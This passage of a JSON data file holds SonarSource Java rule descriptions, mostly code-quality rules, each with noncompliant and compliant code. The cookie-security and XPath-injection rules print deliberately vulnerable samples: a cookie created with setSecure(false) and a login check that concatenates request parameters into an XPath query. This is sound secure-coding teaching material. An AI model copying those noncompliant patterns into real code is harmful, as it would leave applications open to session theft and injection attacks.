<code>URL</code> 's in <code>Map</code> and <code>Set</code> , and for explicit calls to the <code>equals</code> and\n<code>hashCode</code> methods. It suggests reconsidering the use of <code>URL</code> in such scenarios to avoid potential performance issues related\nto name service lookups.</p>\n<h2>How to fix it</h2>\n<p>Use the <code>URI</code> class until access to the resource is actually needed.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void checkUrl(URL url) {\n  Set&lt;URL&gt; sites = new HashSet&lt;URL&gt;();               // Noncompliant\n\n  URL homepage = new URL(\"http://sonarsource.com\");  // Compliant\n  if (homepage.equals(url)) {                        // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void checkUrl(URL url) {\n  Set&lt;URI&gt; sites = new HashSet&lt;URI&gt;();               // Compliant\n\n  URI homepage = new URI(\"http://sonarsource.com\");  // Compliant\n  URI uri = url.toURI();\n  if (homepage.equals(uri)) {                        // Compliant\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/net/URL.html\">Oracle Java SE - java.net.URL</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2112","summary":"\"URL.hashCode\" and \"URL.equals\" should be avoided","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>BigDecimal</code> is used to represents immutable, arbitrary-precision signed decimal numbers.</p>\n<p>Differently from the <code>BigDecimal</code>, the <code>double</code> primitive type and the <code>Double</code> type have limited precision due to\nthe use of double-precision 64-bit IEEE 754 floating point. Because of floating point imprecision, the <code>BigDecimal(double)</code> constructor can\nbe somewhat unpredictable.</p>\n<p>For example writing <code>new BigDecimal(0.1)</code> doesnât create a BigDecimal which is exactly equal to 0.1, but it is equal to\n0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly as a double (or, for that matter, as a\nbinary fraction of any finite length).</p>\n<h2>How to fix it</h2>\n<p>Use <code>BigDecimal.valueOf</code>, which uses a string under the covers to eliminate floating point rounding errors, or the constructor that\ntakes a <code>String</code> argument.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ndouble d = 1.1;\n\nBigDecimal bd1 = new BigDecimal(d);   // Noncompliant\nBigDecimal bd2 = new BigDecimal(1.1); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ndouble d = 1.1;\n\nBigDecimal bd1 = BigDecimal.valueOf(d); // Compliant\nBigDecimal bd2 = new BigDecimal(\"1.1\"); // Compliant\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/math/BigDecimal.html\">Oracle - BigDecimal</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/kzdGBQ\">CERT, NUM10-J</a> - Do not construct BigDecimal objects from floating-point literals\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-2111","summary":"\"BigDecimal(double)\" should not be used","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Whether the valid value ranges for <code>Date</code> fields start with 0 or 1 varies by field. For instance, month starts at 0, and day of month\nstarts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without error or exception. For instance, enter 12\nfor month, and youâll get January of the following year.</p>\n<p>This rule checks for bad values used in conjunction with <code>java.util.Date</code>, <code>java.sql.Date</code>, and\n<code>java.util.Calendar</code>. Specifically, values outside of the valid ranges:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Field</th>\n      <th>Valid</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>month</p></td>\n      <td><p>0-11</p></td>\n    </tr>\n    <tr>\n      <td><p>date (day)</p></td>\n      <td><p>0-31</p></td>\n    </tr>\n    <tr>\n      <td><p>hour</p></td>\n      <td><p>0-23</p></td>\n    </tr>\n    <tr>\n      <td><p>minute</p></td>\n      <td><p>0-60</p></td>\n    </tr>\n    <tr>\n      <td><p>second</p></td>\n      <td><p>0-61</p></td>\n    </tr>\n  </tbody>\n</table>\n<p>Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid uses of the 31st day of the month.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(12);  // Noncompliant; rolls d into the next year\n\nCalendar c = new GregorianCalendar(2014, 12, 25);  // Noncompliant\nif (c.get(Calendar.MONTH) == 12) {  // Noncompliant; invalid comparison\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(11);\n\nCalendar c = new Gregorian Calendar(2014, 11, 25);\nif (c.get(Calendar.MONTH) == 11) {\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2110","summary":"Invalid \"Date\" values should not be used","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Denoted by the \"@\" symbol, annotations are metadata that can be added to classes, methods, and variables for various purposes such as\ndocumentation, code analysis, and runtime processing.</p>\n<p>Annotations have retention policies that determine in which context they are retained and available for use. There are three retention policies for\nannotations:</p>\n<ul>\n  <li> <code>RetentionPolicy.SOURCE</code> - Annotations are only available during compilation and code analysis. They are not included in the\n  compiled class file and are not available at runtime. E.G. <code>@Override</code>, <code>@SuppressWarnings</code> </li>\n  <li> <code>RetentionPolicy.CLASS</code> - Annotations are included in the compiled class file providing information to the compiler, but they are\n  not retained by the JVM at runtime. This is the default retention policy. E.G. <code>@PreviewFeature</code> </li>\n  <li> <code>RetentionPolicy.RUNTIME</code> - Annotations are included in the compiled class file and available at runtime. They can be accessed and\n  used by the program through reflection. E.G. <code>@FunctionalInterface</code>, <code>@Deprecated</code> </li>\n</ul>\n<p>It is important to understand that only annotations having the <code>RUNTIME</code> retention policy can be accessed at runtime using reflection.\nFor example, the following if condition is true when the method argument is the <code>java.util.function.Function</code> class:</p>\n<pre>\nvoid execute(Class&lt;?&gt; cls) {\n  if (cls.isAnnotationPresent(FunctionalInterface.class)) {\n    // ...\n  }\n}\n</pre>\n<p>Therefore, it is an issue to use reflection in combination with annotations with the <code>SOURCE</code> or <code>CLASS</code> retention policy\nbecause they are not present at runtime. For example, in the JVM source code, the <code>hashCode()</code> method of the <code>Integer</code> class has\nthe <code>@Override</code> annotation. However, the following if condition will always be false even if the method argument is the\n<code>Integer#hashCode()</code> method because <code>@Override</code> has the <code>SOURCE</code> retention policy:</p>\n<pre>\nvoid execute(Method method) {\n  if (method.isAnnotationPresent(Override.class)) { // Noncompliant, if condition will always be false because\n                                                    // @Override is declared with @Retention(RetentionPolicy.SOURCE)\n    // ...\n  }\n}\n</pre>\n<p>This rule detects improper reflective access on annotations having the <code>SOURCE</code> or <code>CLASS</code> retention policy.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/annotation/RetentionPolicy.html\">Oracle SDK -\n  java.lang.annotation.RetentionPolicy</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2109","summary":"Reflection should not be used to check non-runtime annotations","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The <code>Object#equals(Object obj)</code> method is used to compare two objects to see if they are equal.</p>\n<p>The <code>obj</code> parameterâs type is <code>Object</code>, this means that an object of any type can be passed as a parameter to this\nmethod.</p>\n<p>Any class overriding <code>Object#equals(Object obj)</code> should respect this contract, accept any object as an argument, and return\n<code>false</code> when the argumentâs type differs from the expected type. The <code>obj</code> parameterâs type can be checked using\n<code>instanceof</code> or by comparing the <code>getClass()</code> value:</p>\n<pre>\n@Override\npublic boolean equals(Object obj) {\n  // ...\n  if (this.getClass() != obj.getClass()) {\n    return false;\n  }\n  // ...\n}\n</pre>\n<p>However, it is an issue to assume that the <code>equals</code> method will only be used to compare objects of the same type. Casting the\n<code>obj</code> parameter without a prior test will throw a <code>ClassCastException</code> instead of returning false.</p>\n<pre>\npublic class MyClass {\n  @Override\n  public boolean equals(Object obj) {\n    MyClass that = (MyClass) obj; // may throw a ClassCastException\n    // ...\n  }\n  // ...\n}\n</pre>\n<p>This rule raises an issue when <code>obj</code> parameterâs type has not been tested before a cast operation.</p>\n<h2>How to fix it</h2>\n<p>Ensure the <code>obj</code> parameterâs type is checked by comparing <code>this.getClass()</code> and <code>obj.getClass()</code>, or use the\n<code>instanceof</code> operator to test `objâs type.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n  @Override\n  public boolean equals(Object obj) {\n    if (this == obj) {\n      return true;\n    }\n    if (obj == null) {\n      return false;\n    }\n    MyClass that = (MyClass) obj; // Noncompliant, may throw a ClassCastException\n    // ...\n  }\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n  @Override\n  public boolean equals(Object obj) {\n    if (this == obj) {\n      return true;\n    }\n    if (obj == null || this.getClass() != obj.getClass()) {\n      return false;\n    }\n    MyClass that = (MyClass) obj; // Compliant, obj's type is MyClass\n    // ...\n  }\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/Object.html#equals(java.lang.Object)\">Oracle SDK -\n  java.lang.Object#equals(Object obj)</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2097","summary":"\"equals(Object obj)\" should test the argument's type","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Thereâs no reason for a <code>main</code> method to <code>throw</code> anything. After all, whatâs going to catch it?</p>\n<p>Instead, the method should itself gracefully handle any exceptions that may bubble up to it, attach as much contextual information as possible, and\nperform whatever logging or user communication is necessary, and <code>exit</code> with a non-zero (i.e. non-success) exit code if necessary.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic static void main(String args[]) throws Exception { // Noncompliant\n  doSomething();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic static void main(String args[]) {\n try {\n    doSomething();\n  } catch (Throwable t) {\n    log.error(t);\n    System.exit(1);  // Default exit code, 0, indicates success. Non-zero value means failure.\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2096","summary":"\"main\" should not \"throw\" anything","tags":["error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Connections, streams, files, and other classes that implement the <code>Closeable</code> interface or its super-interface,\n<code>AutoCloseable</code>, needs to be closed after use. Further, that <code>close</code> call must be made in a <code>finally</code> block otherwise\nan exception could keep the call from being made. Preferably, when class implements <code>AutoCloseable</code>, resource should be created using\n\"try-with-resources\" pattern and will be closed automatically.</p>\n<p>Failure to properly close resources will result in a resource leak which could bring first the application and then perhaps the box the application\nis on to their knees.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nprivate void readTheFile() throws IOException {\n  Path path = Paths.get(this.fileName);\n  BufferedReader reader = Files.newBufferedReader(path, this.charset);\n  // ...\n  reader.close();  // Noncompliant\n  // ...\n  Files.lines(\"input.txt\").forEach(System.out::println); // Noncompliant: The stream needs to be closed\n}\n\nprivate void doSomething() {\n  OutputStream stream = null;\n  try {\n    for (String property : propertyList) {\n      stream = new FileOutputStream(\"myfile.txt\");  // Noncompliant\n      // ...\n    }\n  } catch (Exception e) {\n    // ...\n  } finally {\n    stream.close();  // Multiple streams were opened. Only the last is closed.\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprivate void readTheFile(String fileName) throws IOException {\n    Path path = Paths.get(fileName);\n    try (BufferedReader reader = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {\n      reader.readLine();\n      // ...\n    }\n    // ..\n    try (Stream&lt;String&gt; input = Files.lines(\"input.txt\"))  {\n      input.forEach(System.out::println);\n    }\n}\n\nprivate void doSomething() {\n  OutputStream stream = null;\n  try {\n    stream = new FileOutputStream(\"myfile.txt\");\n    for (String property : propertyList) {\n      // ...\n    }\n  } catch (Exception e) {\n    // ...\n  } finally {\n    stream.close();\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Instances of the following classes are ignored by this rule because <code>close</code> has no effect:</p>\n<ul>\n  <li> <code>java.io.ByteArrayOutputStream</code> </li>\n  <li> <code>java.io.ByteArrayInputStream</code> </li>\n  <li> <code>java.io.CharArrayReader</code> </li>\n  <li> <code>java.io.CharArrayWriter</code> </li>\n  <li> <code>java.io.StringReader</code> </li>\n  <li> <code>java.io.StringWriter</code> </li>\n</ul>\n<p>Java 7 introduced the try-with-resources statement, which implicitly closes <code>Closeables</code>. All resources opened in a try-with-resources\nstatement are ignored by this rule.</p>\n<pre>\ntry (BufferedReader br = new BufferedReader(new FileReader(fileName))) {\n  //...\n}\ncatch ( ... ) {\n  //...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/459\">CWE-459 - Incomplete Cleanup</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/772\">CWE-772 - Missing Release of Resource after Effective Lifetime</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/vjdGBQ\">CERT, FIO04-J.</a> - Release resources when they are no longer needed </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/QtUxBQ\">CERT, FIO42-C.</a> - Close files when they are no longer needed </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html\">Try With Resources</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-2095","summary":"Resources should be closed","tags":["cwe","leak","denial-of-service","cert","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>There is no good excuse for an empty class. If itâs being used simply as a common extension point, it should be replaced with an\n<code>interface</code>. If it was stubbed in as a placeholder for future development it should be fleshed-out. In any other case, it should be\neliminated.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Nothing {  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic interface Nothing {\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Empty classes can be used as marker types (for Spring for instance), therefore empty classes that are annotated will be ignored.</p>\n<pre>\n@Configuration\n@EnableWebMvc\npublic final class ApplicationConfiguration {\n\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2094","summary":"Classes should not be empty","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Many resources in Java need be closed after they have been used. If they are not, the garbage collector cannot reclaim the resources' memory, and\nthey are still considered to be in use by the operating system. Such resources are considered to be leaked, which can lead to performance issues.</p>\n<p>Java 7 introduced the try-with-resources statement, which guarantees that the resource in question will be closed.</p>\n<pre>\ntry (InputStream input = Files.newInputStream(path)) {\n  // \"input\" will be closed after the execution of this block\n}\n</pre>\n<p>This syntax is safer than the traditional method using <code>try</code>, <code>catch</code>, and <code>finally</code> and hence should be\npreferred.</p>\n<p>This rule raises an issue if a closeable resources is not opened using a try-with-resources statement.</p>\n<p>This rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>7</code> as the close-with-resources\nstatement was unavailable prior to Java 7.</p>\n<h2>How to fix it</h2>\n<p>Use the try-with-resources syntax by moving the <code>Closable</code> variable declarations after the <code>try</code> keyword surrounded by\nparentheses and separated by <code>;</code>:</p>\n<pre>\ntry (/* resources declarations */) {\n  // resources usage ...\n}\n</pre>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFileReader fr = null;\nBufferedReader br = null;\n\ntry { // Noncompliant, the FileReader and BufferedReader are instantiated without try-with-resources\n  fr = new FileReader(fileName);\n  br = new BufferedReader(fr);\n  return br.readLine();\n} catch (...) {\n  ...\n} finally {\n\n  if (br != null) { // br has to be closed manually\n    try {\n      br.close();\n    } catch(IOException e){...}\n  }\n\n  if (fr != null ) { // fr has to be closed manually\n    try {\n      br.close();\n    } catch(IOException e){...}\n  }\n\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ntry ( // Compliant, all resources are instantiated within a try-with-resources statement and hence automatically closed after use\n    FileReader fr = new FileReader(fileName);\n    BufferedReader br = new BufferedReader(fr)\n  ) {\n  return br.readLine();\n}\ncatch (...) {}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6DZGBQ\">CERT, ERR54-J.</a> - Use a try-with-resources statement to safely handle closeable\n  resources </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html\">The Javaâ¢ Tutorials - The try-with-resources\n  Statement</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2093","summary":"Try-with-resources should be used","tags":["java8","cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP\nrequest and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>\n  <li> itâs not sure that the website contains <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">mixed content</a> or not\n  (ie HTTPS everywhere or not) </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour\n  when creating cookies. </li>\n  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>If you create a security-sensitive cookie in your JAVA code:</p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setSecure(false);  // Sensitive: a security-ensitive cookie is created with the secure flag set to false\n</pre>\n<p>By default the <a href=\"https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure(boolean)\"><code>secure</code></a> flag is set\nto <em>false:</em></p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setSecure(true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag set to true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/614\">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222576\">Application Security and\n  Development: V-222576</a> - The application must set the secure flag on session cookies. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2092","summary":"Creating cookies without the \"secure\" flag is security-sensitive","tags":["cwe","spring","privacy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without\nsanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to execute malicious commands in the affected XML documents.</p>\n<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML\nstructures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to\nharmless.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data Leaks</h4>\n<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility\nstill exists with configuration files, for example.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked\norganization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the\nregular operations of an organization.</p>\n<h2>How to fix it in Java XML API</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to XPath injections because untrusted data is concatenated to an XPath query without prior\nvalidation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.xpath.XPath;\nimport javax.xml.xpath.XPathConstants;\n\npublic boolean authenticate(HttpServletRequest request, XPath xpath, Document doc) throws XPathExpressionException {\n  String user = request.getParameter(\"user\");\n  String pass = request.getParameter(\"pass\");\n\n  String expression = \"/users/user[@name='\" + user + \"' and @pass='\" + pass + \"']\";\n\n  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.xpath.XPath;\nimport javax.xml.xpath.XPathConstants;\nimport javax.xml.xpath.XPathVariableResolver;\n\npublic boolean authenticate(HttpServletRequest request, XPath xpath, Document doc) throws XPathExpressionException {\n  String user = request.getParameter(\"user\");\n  String pass = request.getParameter(\"pass\");\n\n  String expression = \"/users/user[@name=$user and @pass=$pass]\";\n\n  xpath.setXPathVariableResolver(v -&gt; {\n    switch (v.getLocalPart()) {\n      case \"user\":\n        return user;\n      case \"pass\":\n        return pass;\n      default:\n        throw new IllegalArgumentException();\n    }\n  });\n\n  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<h4>Parameterized Queries</h4>\n<p>For XPath injections, the cleanest way to do so is to use parameterized queries.</p>\n<p>XPath allows for the usage of variables inside expressions in the form of <code>$variable</code>. XPath variables can be used to construct an XPath\nquery without needing to concatenate user arguments to the query at runtime. Here is an example of an XPath query with variables:</p>\n<pre>\n/users/user[@user=$user and @pass=$pass]\n</pre>\n<p>When the XPath query is executed, the user input is passed alongside it. During execution, when the values of the variables need to be known, a\nresolver will return the correct user input for each variable. The contents of the variables are not considered application logic by the XPath\nexecutor, and thus injection is not possible.</p>\n<p>In the example, a parameterized XPath query is created, and an <code>XPathVariableResolver</code> is used to securely insert untrusted data into\nthe query, similar to parameterized SQL queries.</p>\n<h4>Validation</h4>\n<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it\nin an XPath query.</p>\n<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>\n<p>Input can be validated in multiple ways:</p>\n<ul>\n  <li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li>\n  <li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric\n  characters.) </li>\n  <li> By ensuring user input does not include any XPath metacharacters, such as <code>\"</code>, <code>'</code>, <code>/</code>, <code>@</code>,\n  <code>=</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li>\n</ul>\n<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>\n<p>For Java, OWASPâs Enterprise Security API offers <a\nhref=\"https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForXPath-java.lang.String-\"><code>encodeForXPath</code></a>\nwhich sanitizes metacharacters automatically.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection\">XPath Injection\n  Prevention Cheat Sheet</a> </li>\n  <li> Ambionics - <a href=\"https://web.archive.org/web/20230602194100/https://www.ambionics.io/blog/hacking-watchguard-firewalls\">XPath Injection\n  Section of \"Hacking WatchGuard Firewalls'</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/643\">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222608\">Application Security and\n  Development: V-222608</a> - The application must not be vulnerable to XML-oriented attacks. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2091","summary":"XPath expressions should not be vulnerable to injection attacks","tags":["cwe","cert","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Path injections 